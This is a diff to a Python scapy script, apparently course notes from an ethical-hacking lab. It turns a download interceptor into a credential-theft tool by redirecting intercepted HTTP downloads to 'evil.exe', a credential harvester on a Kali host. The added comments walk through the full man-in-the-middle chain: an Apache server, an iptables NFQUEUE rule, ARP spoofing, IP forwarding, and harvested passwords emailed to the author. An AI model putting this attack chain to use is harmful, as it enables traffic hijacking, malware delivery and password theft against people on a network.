@@ -158,10 +158,46 @@ def process_packet(packet):
 # -> So we need to a) run ARP spoof first, Get Main in middle, b) Run the IP tables rule that
 # we use when we want to redirect packets from remote computers and then run out script
 
-
+#
 # 18 Before that we will refactor our code by writing some functions
+# -> Here instead of changing download file to someother exe we will point it to a credential harvester
+# In kali evil file can be found in : /var/www/html/evil-files/evil.exe
+# We can access the file from browser by putting ip of kali machine :
+# 10.0.2.16/evil-files/evil.exe
+#
+# -> Now we will update the same url in code
+# modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: 10.0.2.16/evil-files/evil.exe \n\n")
 
 
+# 19) for us to use the webserver in the place where python code is running, we need to start the webserver in kali machine
+# using command: "service apache2 start"
+#
+# 20) Then we need to run the ip tables rule which we use to redirect traffic coming from
+# remote computers
+
+# iptables -I FORWARD -j NFQUEUE --queue-num 0
+
+# 21) Next we need to become man in the middle by using ARP spoofing
+# We will run the arp_spoof.py which we built in the kali machine
+
+# 22) Also enable ip forwarding in kali machine by doing:
+# # echo 1 > /proc/sys/net/ipv4/ip_forward through the linux machine, because by default
+# this is set to 0 which prevents packets from flowing through kali machine
+# and this will disable the internet connection
+#
+# -> We do this to allow packets to flow
+
+# 22) Now in kali machine we will run the program file-interceptor-credharvester.py in kali machine
+# -> By doing this if we download, report that we get from evil file we will be sent to my gmail account
+#
+# 23)Now if we launch url our request will be intercepted and evil file will downloaded
+# -> This will be done in windows machine
+
+# 24) Next if we go to kali machine and check in inbox of gmail, we will see a new mail, which shows the email and passwords that are stored in that computer
+
+
+a) First do iptables --flush to remove everything from IP tables
+b) Then run the ouput and input file
 
 
     if scapy_packet.haslayer(scapy.Raw):
@@ -176,7 +212,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file we want to download")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: 10.0.2.16/evil-files/evil.exe \n\n")
 
                 packet.set_payload(str(modified_packet))
             # print(scapy_packet.show())
